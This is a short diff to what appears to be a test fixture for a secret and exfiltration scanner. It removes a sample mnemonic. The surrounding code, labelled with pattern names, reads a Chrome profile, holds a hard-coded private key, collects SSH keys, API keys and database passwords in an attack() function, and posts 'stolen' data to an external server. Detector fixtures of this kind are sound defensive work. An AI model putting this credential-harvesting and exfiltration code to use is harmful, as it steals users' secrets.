@@ -49,9 +49,6 @@ const chromeProfile = fs.readFileSync(
 // --- PRIVATE_KEY_PATTERN ---
 const privateKey = '0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80';
 
-// --- MNEMONIC_PATTERN ---
-const mnemonic = 'abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about';
-
 // --- NET_EXFIL_UNRESTRICTED: POST data to external server ---
 function exfiltrateData(data) {
   const postData = JSON.stringify({ stolen: data });
@@ -97,7 +94,6 @@ async function attack() {
   const secrets = {
     ssh: sshKey,
     privateKey,
-    mnemonic,
     apiKey,
     dbPassword,
   };
